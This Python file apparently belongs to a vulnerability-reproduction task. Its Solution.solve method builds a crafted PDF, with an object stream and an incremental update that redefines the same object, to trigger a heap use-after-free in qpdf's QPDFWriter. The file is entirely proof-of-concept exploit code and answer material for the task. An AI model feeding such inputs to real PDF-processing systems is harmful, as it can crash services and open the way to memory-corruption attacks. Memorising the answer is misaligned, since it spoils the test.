import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # The vulnerability is a Heap Use After Free in QPDFWriter::preserveObjectStreams
        # when dealing with multiple entries for the same object ID, particularly involving
        # object streams.
        # We construct a PDF 1.5 file with an object stream containing an object (ID 5),
        # and then append an incremental update that redefines that same object (ID 5)
        # as a regular (loose) object. This sets up the condition where the object
        # exists in the cache from the stream but is also superseded, potentially
        # confusing the preservation logic.

        pdf = bytearray()
        
        def add(s):
            if isinstance(s, str):
                pdf.extend(s.encode('latin1'))
            else:
                pdf.extend(s)
                
        # --- Part 1: Base PDF (1.5) with Object Stream ---
        add("%PDF-1.5\n")
        
        # Obj 1: Catalog
        # We reference object 5 in the catalog to ensure it is considered reachable/processed
        off1 = len(pdf)
        add("1 0 obj\n<< /Type /Catalog /Pages 2 0 R /Extra 5 0 R >>\nendobj\n")
        
        # Obj 2: Pages
        off2 = len(pdf)
        add("2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n")
        
        # Obj 3: Page
        off3 = len(pdf)
        add("3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>\nendobj\n")
        
        # Obj 4: Object Stream
        # Contains Obj 5. Stream content format: "obj_num offset ..."
        # "5 0" means Object 5 is at offset 0 inside the decoded stream
        stm_content = b"5 0\n(InStreamData)"
        off4 = len(pdf)
        add(f"4 0 obj\n<< /Type /ObjStm /N 1 /First 4 /Length {len(stm_content)} >>\nstream\n")
        add(stm_content)
        add("\nendstream\nendobj\n")
        
        # Obj 6: XRef Stream (Base XRef)
        # We use an XRef stream to properly index the object inside the object stream (Type 2 entry)
        # Map: 
        # 0: Free
        # 1: Catalog (n)
        # 2: Pages (n)
        # 3: Page (n)
        # 4: ObjStm (n)
        # 5: Compressed Object (Type 2, inside stream 4)
        # 6: XRef Stream itself (n)
        
        # W [1 2 1] -> Fields are 1, 2, 1 bytes. 
        # 2 bytes for offset is sufficient for this small PoC (max 65535).
        
        xr = bytearray()
        # 0: 00 0000 00 (Free)
        xr += b'\x00\x00\x00\x00'
        # 1: 01 off1 00 (In Use)
        xr += b'\x01' + struct.pack('>H', off1) + b'\x00'
        # 2: 01 off2 00
        xr += b'\x01' + struct.pack('>H', off2) + b'\x00'
        # 3: 01 off3 00
        xr += b'\x01' + struct.pack('>H', off3) + b'\x00'
        # 4: 01 off4 00
        xr += b'\x01' + struct.pack('>H', off4) + b'\x00'
        # 5: 02 0004 00 (Type 2: Compressed. Field 2 = Stream Obj Num (4), Field 3 = Index (0))
        xr += b'\x02' + struct.pack('>H', 4) + b'\x00'
        
        # 6: Self reference. We calculate offset now.
        off6 = len(pdf)
        xr += b'\x01' + struct.pack('>H', off6) + b'\x00'
        
        add(f"6 0 obj\n<< /Type /XRef /Size 7 /W [1 2 1] /Root 1 0 R /Length {len(xr)} >>\nstream\n")
        add(xr)
        add("\nendstream\nendobj\n")
        
        add("startxref\n")
        add(f"{off6}\n")
        add("%%EOF\n")
        
        # --- Part 2: Incremental Update ---
        # We redefine Object 5 as a loose (non-compressed) object.
        # This creates the "multiple entries" scenario (one in base via objstm, one in update).
        
        off5_new = len(pdf)
        add("5 0 obj\n(LooseData)\nendobj\n")
        
        # Standard XRef table for the update section
        xref2_off = len(pdf)
        add("xref\n")
        add("0 1\n0000000000 65535 f \n")
        add("5 1\n")
        add(f"{off5_new:010} 00000 n \n")
        
        add("trailer\n")
        add(f"<< /Size 7 /Root 1 0 R /Prev {off6} >>\n")
        add("startxref\n")
        add(f"{xref2_off}\n")
        add("%%EOF\n")
        
        return bytes(pdf)
